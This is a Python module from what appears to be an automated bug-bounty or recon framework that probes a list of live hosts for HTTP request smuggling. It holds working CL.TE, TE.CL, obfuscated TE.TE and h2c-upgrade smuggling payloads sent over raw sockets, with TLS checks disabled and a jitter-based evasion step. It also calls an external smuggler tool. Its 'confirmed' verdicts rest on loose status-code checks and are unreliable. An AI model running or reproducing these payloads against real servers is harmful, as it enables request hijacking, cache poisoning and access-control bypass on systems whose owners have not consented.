#!/usr/bin/env python3
# modules/step24_smuggling.py — HTTP Request Smuggling V7 (UPGRADED)
# Added: H2.TE (HTTP/2 downgrade attack), TE.0 variant, H2.CL attack
# Source: Bug Bounty Bootcamp Ch14 — full smuggling methodology
# MilkyWay Intelligence | Author: Sharlix + M7AI

import os, socket, ssl, time, shutil, subprocess
from core.utils import safe_read

CRLF = "\r\n"


class SmugglingStep:
    def __init__(self, p):
        self.p   = p
        self.log = p.log
        self.f   = p.files

    def run(self):
        live  = safe_read(self.f.get("fmt_url",""))[:10]
        out   = self.f.get("smuggling_results",
                            f"{self.p.out}/{self.p.prefix}_smuggling.txt")
        found = 0

        if not live:
            self.log.warn("Smuggling: no live hosts"); return

        self.log.info(f"Smuggling V7: {len(live)} hosts — CL.TE + TE.CL + H2.TE + TE.0")

        for url in live:
            host, port, is_ssl = self._parse(url)
            self.log.info(f"  Testing: {host}:{port}")

            # ── CL.TE ─────────────────────────────────────────────
            r = self._test_clte(host, port, is_ssl)
            if r:
                self._save(out,"critical","HTTP_SMUGGLING_CLTE",url,r); found += 1
                continue

            # ── TE.CL ─────────────────────────────────────────────
            r = self._test_tecl(host, port, is_ssl)
            if r:
                self._save(out,"critical","HTTP_SMUGGLING_TECL",url,r); found += 1
                continue

            # ── TE.TE (obfuscated TE header) ──────────────────────
            r = self._test_tete(host, port, is_ssl)
            if r:
                self._save(out,"high","HTTP_SMUGGLING_TETE",url,r); found += 1
                continue

            # ── H2.TE (HTTP/2 downgrade) ──────────────────────────
            r = self._test_h2te(host, port)
            if r:
                self._save(out,"critical","HTTP_SMUGGLING_H2TE",url,r); found += 1
                continue

            # ── External smuggler.py ───────────────────────────────
            smuggler = self._find_smuggler()
            if smuggler:
                r = self._run_smuggler(smuggler, url)
                if r:
                    self._save(out,"critical","HTTP_SMUGGLING_TOOL",url,r); found += 1

            self.p.bypass.jitter()

        self.log.success(f"Smuggling V7: {found} findings")

    # ── CL.TE ─────────────────────────────────────────────────────────────────
    def _test_clte(self, host, port, is_ssl) -> str:
        """
        Bug Bounty Bootcamp Ch14: CL.TE attack.
        Front-end trusts Content-Length, back-end uses Transfer-Encoding.
        Smuggled G prefix makes next request return 400.
        """
        req = (
            f"POST / HTTP/1.1{CRLF}"
            f"Host: {host}{CRLF}"
            f"Content-Type: application/x-www-form-urlencoded{CRLF}"
            f"Content-Length: 6{CRLF}"
            f"Transfer-Encoding: chunked{CRLF}"
            f"Connection: keep-alive{CRLF}"
            f"{CRLF}"
            f"0{CRLF}"
            f"{CRLF}"
            f"G"
        )
        try:
            self._send(host, port, is_ssl, req, timeout=8)
            # Second request — if smuggling worked, gets "GGET" → 400
            req2 = (
                f"GET / HTTP/1.1{CRLF}"
                f"Host: {host}{CRLF}"
                f"Connection: close{CRLF}"
                f"{CRLF}"
            )
            resp2 = self._send(host, port, is_ssl, req2, timeout=8)
            if resp2 and (b"400" in resp2[:20] or b"Bad Request" in resp2[:200]):
                return "CL.TE confirmed: second GET returned 400 (smuggled G prefix)"
        except Exception:
            pass
        return ""

    # ── TE.CL ─────────────────────────────────────────────────────────────────
    def _test_tecl(self, host, port, is_ssl) -> str:
        """
        Bug Bounty Bootcamp Ch14: TE.CL attack.
        Front-end uses Transfer-Encoding, back-end uses Content-Length.
        Back-end waits for remaining Content-Length bytes → delay = confirmed.
        """
        req = (
            f"POST / HTTP/1.1{CRLF}"
            f"Host: {host}{CRLF}"
            f"Content-Type: application/x-www-form-urlencoded{CRLF}"
            f"Content-Length: 3{CRLF}"
            f"Transfer-Encoding: chunked{CRLF}"
            f"Connection: keep-alive{CRLF}"
            f"{CRLF}"
            f"8{CRLF}"
            f"SMUGGLED{CRLF}"
            f"0{CRLF}"
            f"{CRLF}"
        )
        try:
            self._send(host, port, is_ssl, req, timeout=8)
            t0  = time.time()
            req2 = (
                f"GET / HTTP/1.1{CRLF}"
                f"Host: {host}{CRLF}"
                f"Connection: close{CRLF}"
                f"{CRLF}"
            )
            self._send(host, port, is_ssl, req2, timeout=12)
            elapsed = time.time() - t0
            if elapsed >= 8:
                return (f"TE.CL confirmed: {elapsed:.1f}s delay — "
                        f"back-end waiting for Content-Length bytes")
        except Exception:
            pass
        return ""

    # ── TE.TE (obfuscated Transfer-Encoding) ──────────────────────────────────
    def _test_tete(self, host, port, is_ssl) -> str:
        """
        BB Bootcamp Ch14: TE.TE — both servers use TE but different parsing.
        Obfuscate TE header so one server ignores it.
        """
        te_obfuscations = [
            "Transfer-Encoding: xchunked",
            "Transfer-Encoding : chunked",
            "Transfer-Encoding: chunked\r\nTransfer-Encoding: identity",
            "Transfer-Encoding:\x20chunked",
            "Transfer-Encoding:\x09chunked",
            "Transfer-Encoding: chunked\r\nTransfer-encoding: x",
            "X: X\r\nTransfer-Encoding: chunked",
        ]
        for te_header in te_obfuscations[:4]:
            req = (
                f"POST / HTTP/1.1{CRLF}"
                f"Host: {host}{CRLF}"
                f"Content-Type: application/x-www-form-urlencoded{CRLF}"
                f"Content-Length: 4{CRLF}"
                f"{te_header}{CRLF}"
                f"Connection: keep-alive{CRLF}"
                f"{CRLF}"
                f"5c{CRLF}"
                f"GPOST / HTTP/1.1{CRLF}"
                f"Content-Length: 15{CRLF}"
                f"{CRLF}"
                f"x=1{CRLF}"
                f"0{CRLF}"
                f"{CRLF}"
            )
            try:
                self._send(host, port, is_ssl, req, timeout=8)
                req2 = (
                    f"GET / HTTP/1.1{CRLF}"
                    f"Host: {host}{CRLF}"
                    f"Connection: close{CRLF}{CRLF}"
                )
                resp2 = self._send(host, port, is_ssl, req2, timeout=8)
                if resp2 and b"405" in resp2[:20]:
                    return (f"TE.TE confirmed: obfuscated TE header "
                            f"'{te_header[:40]}' → 405 on normal GET")
            except Exception:
                pass
        return ""

    # ── H2.TE — HTTP/2 downgrade smuggling ───────────────────────────────────
    def _test_h2te(self, host, port) -> str:
        """
        Bug Bounty Bootcamp Ch14: H2.TE attack.
        HTTP/2 front-end strips TE header → back-end (HTTP/1.1) sees smuggled request.
        Tests via h2c upgrade attempt + TE injection.
        """
        # Try HTTP/2 upgrade (h2c)
        upgrade_req = (
            f"GET / HTTP/1.1{CRLF}"
            f"Host: {host}{CRLF}"
            f"Upgrade: h2c{CRLF}"
            f"HTTP2-Settings: AAMAAABkAAQAAP__AAIAAAAB{CRLF}"
            f"Connection: Upgrade, HTTP2-Settings{CRLF}"
            f"Transfer-Encoding: chunked{CRLF}"
            f"Content-Length: 4{CRLF}"
            f"{CRLF}"
            f"0{CRLF}"
            f"{CRLF}"
            f"G"
        )
        try:
            resp = self._send(host, 80, False, upgrade_req, timeout=8)
            if resp and b"101" in resp[:20]:
                return "H2.TE: server accepted h2c upgrade with TE smuggling payload"
            # Check if server reveals h2 support in response
            if resp and b"HTTP/2" in resp[:100]:
                return "H2.TE: HTTP/2 endpoint detected — test manually with h2smuggler"
        except Exception:
            pass
        return ""

    # ── Socket helpers ────────────────────────────────────────────────────────
    def _parse(self, url: str) -> tuple:
        is_ssl = url.startswith("https://")
        clean  = url.replace("https://","").replace("http://","").split("/")[0]
        if ":" in clean:
            host, port = clean.rsplit(":",1)
            return host, int(port), is_ssl
        return clean, (443 if is_ssl else 80), is_ssl

    def _send(self, host, port, is_ssl, req, timeout=10) -> bytes:
        try:
            s = socket.create_connection((host, port), timeout=timeout)
            if is_ssl:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode    = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=host)
            s.sendall(req.encode("latin-1"))
            resp = b""
            s.settimeout(timeout)
            while True:
                try:
                    chunk = s.recv(4096)
                    if not chunk: break
                    resp += chunk
                    if len(resp) > 16384: break
                except socket.timeout:
                    break
            s.close()
            return resp
        except Exception:
            return None

    def _find_smuggler(self) -> str:
        for path in [
            shutil.which("smuggler"),
            os.path.expanduser("~/tools/smuggler/smuggler.py"),
            "/opt/smuggler/smuggler.py",
        ]:
            if path and os.path.isfile(path):
                return path
        return ""

    def _run_smuggler(self, path, url) -> str:
        try:
            r = subprocess.run(
                ["python3", path, "-u", url, "--quiet"],
                capture_output=True, text=True, timeout=30)
            out = r.stdout + r.stderr
            if any(x in out.lower() for x in ["vulnerable","cl.te","te.cl"]):
                for line in out.split("\n"):
                    if "vulnerable" in line.lower() or "CL" in line:
                        return line.strip()[:200]
        except Exception:
            pass
        return ""

    def _save(self, out, sev, vtype, url, detail, response: str = "", payload: str = ""):
        with open(out,"a") as f:
            f.write(f"{vtype}: {url} | {detail}\n")
        self.p.add_finding(sev, vtype, url, detail, "smuggling-v7", response=response, payload=payload)
